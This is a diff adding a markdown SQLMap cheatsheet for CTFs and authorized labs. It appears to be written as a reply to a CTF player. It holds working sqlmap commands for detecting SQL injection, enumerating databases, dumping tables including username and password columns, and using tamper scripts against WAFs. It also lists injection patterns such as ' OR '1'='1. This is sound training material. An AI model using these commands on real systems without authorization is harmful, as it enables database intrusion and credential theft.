@@ -1,0 +1,568 @@
+# **SQL Injection & SQLMap CTF Cheatsheet**
+
+Bro, here's a reusable SQLMap cheatsheet for web CTFs and authorized penetration-testing labs. It covers the workflow from **finding SQL injection → identifying the database → enumerating databases/tables/columns → dumping challenge data → troubleshooting**.
+
+I'll use your previous challenge request as an example, where the injectable parameter was `q` and the request was stored in `req.txt`.
+
+> **Important:** SQLMap automates SQL injection testing. It does not guarantee that every injection type is exploitable or that every database supports the same features. Use these commands only on CTF targets, labs, or systems where you have permission.
+
+## **1. Understand the basic SQLMap syntax**
+
+```
+sqlmap -u "URL" [OPTIONS]
+```
+
+| Option            | Meaning                                     |
+| ----------------- | ------------------------------------------- |
+| `-u`              | Target URL                                  |
+| `-r`              | Read a raw HTTP request from a file         |
+| `-p`              | Specify the injectable parameter            |
+| `--data`          | Send POST body data                         |
+| `--cookie`        | Add session cookies                         |
+| `--headers`       | Add custom HTTP headers                     |
+| `--batch`         | Use default answers; no interactive prompts |
+| `-v 3`            | Show more detailed output                   |
+| `--flush-session` | Clear cached SQLMap session for the target  |
+| `--random-agent`  | Use a randomly selected User-Agent          |
+| `--technique`     | Restrict SQL injection techniques           |
+| `--level`         | Increase test coverage                      |
+| `--risk`          | Increase test intensity                     |
+
+## **2. Prepare your HTTP request**
+
+**Best approach: capture the request using Burp Suite.**
+
+1. Open the target in your browser.
+2. Intercept the request in Burp Proxy.
+3. Right-click → Save item.
+4. Save it as `req.txt`.
+5. Keep the request method, path, Host, cookies, headers and body intact.
+
+Example:
+
+```
+GET /vuln.php?q=flag HTTP/1.1
+Host: example.ctf:10183
+Cookie: PHPSESSID=YOUR_SESSION_ID
+User-Agent: Mozilla/5.0
+Accept: */*
+Connection: close
+```
+
+Run SQLMap:
+
+```
+sqlmap -r req.txt --batch
+```
+
+**Why use&#x20;**`-r`**?** It preserves the actual HTTP request, including session cookies and headers. This is especially useful when the challenge requires authentication.
+
+## **3. Test injection and identify the parameter**
+
+Start with basic detection:
+
+```
+sqlmap -r req.txt --batch
+```
+
+Test a particular parameter:
+
+```
+sqlmap -r req.txt -p q --batch
+```
+
+Increase test coverage:
+
+```
+sqlmap -r req.txt -p q --level=3 --risk=1 --batch
+```
+
+For a more extensive test:
+
+```
+sqlmap -r req.txt -p q --level=5 --risk=2 --batch
+```
+
+Restrict the SQL injection techniques:
+
+```
+sqlmap -r req.txt -p q --technique=BEUSTQ --batch
+```
+
+| Letter | Technique           |
+| ------ | ------------------- |
+| B      | Boolean-based blind |
+| E      | Error-based         |
+| U      | UNION query-based   |
+| S      | Stacked queries     |
+| T      | Time-based blind    |
+| Q      | Inline queries      |
+
+**Example:** Your earlier challenge showed Boolean-based blind and time-based blind detection. That means SQLMap found ways to infer database information through the application's responses and timing.
+
+## **4. Identify the database**
+
+```
+sqlmap -r req.txt -p q --banner --batch
+```
+
+Get the current database:
+
+```
+sqlmap -r req.txt -p q --current-db --batch
+```
+
+Get the database user:
+
+```
+sqlmap -r req.txt -p q --current-user --batch
+```
+
+Check database privileges:
+
+```
+sqlmap -r req.txt -p q --privileges --batch
+```
+
+Check whether the current database user is a DBA:
+
+```
+sqlmap -r req.txt -p q --is-dba --batch
+```
+
+## **5. Enumerate databases and tables**
+
+List databases:
+
+```
+sqlmap -r req.txt -p q --dbs --batch
+```
+
+List tables in a database:
+
+```
+sqlmap -r req.txt -p q -D DATABASE_NAME --tables --batch
+```
+
+Example:
+
+```
+sqlmap -r req.txt -p q -D testdb --tables --batch
+```
+
+**SQLite note:** SQLite is different from MySQL and PostgreSQL. SQLMap may show a database label such as `SQLite_masterdb`. You often do not need to supply `-D` when enumerating SQLite tables.
+
+Your previous result contained:
+
+```
+Database: SQLite_masterdb
+[3 tables]
+flags
+sqlite_sequence
+users
+```
+
+The table names are clues, not proof of where the flag is stored.
+
+## **6. Enumerate columns**
+
+Show all columns in a table:
+
+```
+sqlmap -r req.txt -p q -D DATABASE_NAME -T TABLE_NAME --columns --batch
+```
+
+Example for a SQLite challenge:
+
+```
+sqlmap -r req.txt -p q -T flags --columns --batch
+```
+
+```
+sqlmap -r req.txt -p q -T users --columns --batch
+```
+
+What the options mean:
+
+- `-D`: select a database.
+- `-T`: select a table.
+- `--columns`: retrieve the table's column names and types.
+
+For example, a table might have:
+
+```
+id
+username
+password
+```
+
+That is an example schema, not a claim about your challenge's actual table.
+
+## **7. Dump table contents**
+
+Dump one table:
+
+```
+sqlmap -r req.txt -p q -T flags --dump --batch
+```
+
+Dump a different table:
+
+```
+sqlmap -r req.txt -p q -T users --dump --batch
+```
+
+Dump a table from a specified database:
+
+```
+sqlmap -r req.txt -p q -D DATABASE_NAME -T TABLE_NAME --dump --batch
+```
+
+Dump only selected columns:
+
+```
+sqlmap -r req.txt -p q -T users -C username,password --dump --batch
+```
+
+Dump a limited number of rows:
+
+```
+sqlmap -r req.txt -p q -T users --dump --start=1 --stop=5 --batch
+```
+
+**Remember:** `--dump` retrieves table records; `--columns` only retrieves the schema.
+
+## **8. Work with different HTTP request types**
+
+### **GET parameter**
+
+```
+sqlmap -u "https://example.com/product.php?id=10" -p id --batch
+```
+
+### **POST form data**
+
+```
+sqlmap -u "https://example.com/login.php" \
+--data="username=test&password=test" \
+-p username --batch
+```
+
+### **JSON request**
+
+For an API that accepts JSON:
+
+```
+sqlmap -u "https://example.com/api/login" \
+--data='{"username":"test","password":"test"}' \
+--headers="Content-Type: application/json" \
+-p username --batch
+```
+
+Or save the complete request in `req.txt` and use:
+
+```
+sqlmap -r req.txt -p username --batch
+```
+
+### **Authenticated request with cookies**
+
+```
+sqlmap -u "https://example.com/profile?id=1" \
+--cookie="PHPSESSID=YOUR_SESSION_ID" \
+-p id --batch
+```
+
+### **Custom HTTP headers**
+
+```
+sqlmap -u "https://example.com/api?id=1" \
+--headers="Authorization: Bearer YOUR_TOKEN" \
+-p id --batch
+```
+
+For complex requests, `-r req.txt` is usually easier and less error-prone.
+
+## **9. Test specific injection behaviours**
+
+Use these when you have a reason to investigate a particular technique.
+
+```
+# Boolean-based blind
+sqlmap -r req.txt -p q --technique=B --batch
+
+# Error-based
+sqlmap -r req.txt -p q --technique=E --batch
+
+# UNION-based
+sqlmap -r req.txt -p q --technique=U --batch
+
+# Time-based blind
+sqlmap -r req.txt -p q --technique=T --batch
+
+# Test multiple techniques
+sqlmap -r req.txt -p q --technique=BEUSTQ --batch
+```
+
+For a time-based test, SQLMap may take longer because it needs to compare response delays. Do not assume a slow response alone proves SQL injection.
+
+## **10. Database-specific enumeration**
+
+These options are useful when SQLMap identifies the database type.
+
+| Database             | Useful identification         |
+| -------------------- | ----------------------------- |
+| MySQL / MariaDB      | `--dbms=mysql`                |
+| PostgreSQL           | `--dbms=PostgreSQL`           |
+| Microsoft SQL Server | `--dbms=Microsoft SQL Server` |
+| SQLite               | `--dbms=SQLite`               |
+| Oracle               | `--dbms=Oracle`               |
+
+Example:
+
+```
+sqlmap -r req.txt -p q --dbms=SQLite --batch
+```
+
+Only force `--dbms` when you have evidence about the backend. Normally, let SQLMap detect it.
+
+Useful database-specific commands:
+
+```
+# MySQL version / banner
+sqlmap -r req.txt -p q --banner --batch
+
+# PostgreSQL current database
+sqlmap -r req.txt -p q --current-db --batch
+
+# SQL Server database enumeration
+sqlmap -r req.txt -p q --dbs --batch
+
+# SQLite table enumeration
+sqlmap -r req.txt -p q --tables --batch
+```
+
+## **11. Useful options for troubleshooting**
+
+| Option                          | What it does                            |
+| ------------------------------- | --------------------------------------- |
+| `--flush-session`               | Clears cached session data and retests  |
+| `--fresh-queries`               | Ignores stored query results            |
+| `--force-ssl`                   | Forces HTTPS                            |
+| `--timeout=15`                  | Sets request timeout                    |
+| `--retries=2`                   | Retries failed requests                 |
+| `--threads=2`                   | Uses two concurrent HTTP threads        |
+| `--proxy=http://127.0.0.1:8080` | Sends traffic through Burp              |
+| `-v 3`                          | Shows more request and detection detail |
+| `-v 6`                          | Shows full HTTP traffic details         |
+
+Examples:
+
+```
+# Clear cached detection results
+sqlmap -r req.txt -p q --flush-session --batch
+
+# Send traffic through Burp
+sqlmap -r req.txt -p q --proxy="http://127.0.0.1:8080" --batch
+
+# Increase request timeout
+sqlmap -r req.txt -p q --timeout=15 --retries=2 --batch
+
+# Debug a detection issue
+sqlmap -r req.txt -p q -v 3 --batch
+```
+
+**Important:** SQLMap caches results. If you change the target port, request, session cookie, or parameter, verify that the request file really contains the new values. Use `--flush-session` when you need a fresh detection run.
+
+## **12. Tamper scripts and WAF troubleshooting**
+
+Some authorized labs include filters or a WAF. First inspect the actual blocked request and response. Do not immediately add random tamper scripts.
+
+List available tamper scripts:
+
+```
+ls /usr/share/sqlmap/tamper/
+```
+
+Example of specifying a tamper script in a lab:
+
+```
+sqlmap -r req.txt -p q \
+--tamper=space2comment \
+--batch
+```
+
+You can also specify a user agent:
+
+```
+sqlmap -r req.txt -p q \
+--user-agent="Mozilla/5.0" \
+--batch
+```
+
+Tamper scripts change payload formatting; they do not magically bypass every WAF. Use them only when you understand the filter behaviour and are authorized to test it.
+
+## **13. Save and review SQLMap output**
+
+SQLMap normally saves its results under:
+
+```
+~/.local/share/sqlmap/output/
+```
+
+Check the output directory:
+
+```
+ls -lah ~/.local/share/sqlmap/output/
+```
+
+Search saved output files:
+
+```
+find ~/.local/share/sqlmap/output/ -type f
+```
+
+Specify a custom output directory:
+
+```
+sqlmap -r req.txt -p q --batch \
+--output-dir="./sqlmap-results"
+```
+
+This is useful when you have multiple CTF challenges and want to keep each challenge's results separate.
+
+## **14. SQL injection basics you should recognize manually**
+
+SQLMap is an automation tool. Understanding the underlying SQL behaviour helps you interpret its findings.
+
+| Type                 | Concept                                        | Example pattern        |
+| -------------------- | ---------------------------------------------- | ---------------------- |
+| Boolean-based        | Response changes based on true/false condition | `' AND 1=1--`          |
+| Error-based          | Database error reveals information             | Invalid SQL expression |
+| UNION-based          | Combines results from another query            | `UNION SELECT ...`     |
+| Time-based           | Response delay reveals a condition             | Conditional delay      |
+| Stacked queries      | Executes another SQL statement                 | `; SELECT ...`         |
+| Authentication logic | Changes the logic of a login query             | `' OR '1'='1`          |
+
+These are conceptual examples, not universal payloads. Syntax depends on the database, query context, escaping and application behaviour.
+
+## **15. Common SQLMap errors and fixes**
+
+| Problem                    | What to check                                                       |
+| -------------------------- | ------------------------------------------------------------------- |
+| No parameter found         | Confirm the URL or request contains a parameter                     |
+| Parameter not injectable   | Verify the parameter and try a normal baseline request              |
+| Empty JWT warning          | Capture a valid authenticated request if authentication is required |
+| 403 Forbidden              | Inspect WAF rules, access restrictions and response                 |
+| 401 Unauthorized           | Refresh the session or authorization token                          |
+| Connection timeout         | Check target availability, timeout and network                      |
+| SQLMap resumes old results | Try `--flush-session`                                               |
+| No tables found            | Verify database detection and enumeration results                   |
+| Dump returns no rows       | Inspect columns, row count and whether the table contains data      |
+| Wrong challenge results    | Verify hostname, port, path, cookies and request file               |
+
+For your previous SQLite challenge, remember: you found `flags`, `sqlite_sequence` and `users`. The next useful checks are:
+
+```
+# Inspect the flags schema
+sqlmap -r req.txt -p q -T flags --columns --batch
+
+# Inspect the flags table
+sqlmap -r req.txt -p q -T flags --dump --batch
+
+# Inspect the users schema
+sqlmap -r req.txt -p q -T users --columns --batch
+```
+
+## **16. Complete SQLMap workflow — memorize this**
+
+This is the sequence I'd use when starting a new authorized SQLi CTF challenge.
+
+1. **Capture the request**
+
+   Save the intercepted request as `req.txt`.
+2. **Detect injection**
+   ```
+   sqlmap -r req.txt --batch
+   ```
+3. **Specify the vulnerable parameter**
+   ```
+   sqlmap -r req.txt -p id --batch
+   ```
+4. **Identify the backend**
+   ```
+   sqlmap -r req.txt -p id --banner --current-db --batch
+   ```
+5. **Enumerate databases**
+   ```
+   sqlmap -r req.txt -p id --dbs --batch
+   ```
+6. **Enumerate tables**
+   ```
+   sqlmap -r req.txt -p id -D DATABASE --tables --batch
+   ```
+7. **Enumerate columns**
+   ```
+   sqlmap -r req.txt -p id -D DATABASE -T TABLE --columns --batch
+   ```
+8. **Dump authorized challenge data**
+   ```
+   sqlmap -r req.txt -p id -D DATABASE -T TABLE --dump --batch
+   ```
+9. **Review saved results**
+   ```
+   ls -R ~/.local/share/sqlmap/output/
+   ```
+
+## **17. Quick command reference**
+
+Keep this block handy:
+
+```
+# DETECTION
+sqlmap -r req.txt --batch
+sqlmap -r req.txt -p id --batch
+sqlmap -r req.txt -p id --level=3 --risk=1 --batch
+
+# DATABASE INFORMATION
+sqlmap -r req.txt -p id --banner --batch
+sqlmap -r req.txt -p id --current-db --batch
+sqlmap -r req.txt -p id --current-user --batch
+sqlmap -r req.txt -p id --dbs --batch
+
+# ENUMERATION
+sqlmap -r req.txt -p id --tables --batch
+sqlmap -r req.txt -p id -D DB --tables --batch
+sqlmap -r req.txt -p id -D DB -T TABLE --columns --batch
+
+# DUMPING
+sqlmap -r req.txt -p id -D DB -T TABLE --dump --batch
+sqlmap -r req.txt -p id -D DB -T TABLE -C column --dump --batch
+
+# TROUBLESHOOTING
+sqlmap -r req.txt -p id --flush-session --batch
+sqlmap -r req.txt -p id --timeout=15 --retries=2 --batch
+sqlmap -r req.txt -p id -v 3 --batch
+
+# BURP PROXY
+sqlmap -r req.txt -p id \
+--proxy="http://127.0.0.1:8080" --batch
+```
+
+*Replace `id`, `DB`, `TABLE` and `column` with values from the actual challenge. For SQLite, try omitting `-D` if SQLMap can already identify the database.*
+
+## **18. What to learn after SQLMap**
+
+SQLMap is only one part of SQL injection. To solve more difficult challenges, learn these topics in order:
+
+1. SQL syntax: `SELECT`, `WHERE`, `ORDER BY`, `GROUP BY`, `UNION`.
+2. Manual SQL injection: quote detection, comments, Boolean conditions.
+3. UNION-based SQLi: column counting and compatible data types.
+4. Blind SQLi: Boolean and time-based inference.
+5. Database differences: SQLite, MySQL, PostgreSQL and MSSQL.
+6. Second-order SQL injection and SQL injection in APIs.
+7. WAF behaviour, filtering and safe testing techniques.
+
+**My recommendation:** Don't memorize hundreds of payloads. Understand how the query works, identify the injection context, then use SQLMap to automate the repetitive enumeration.
+
+You can save this as `SQLMap-CTF-Cheatsheet.md` in your CTF notes.
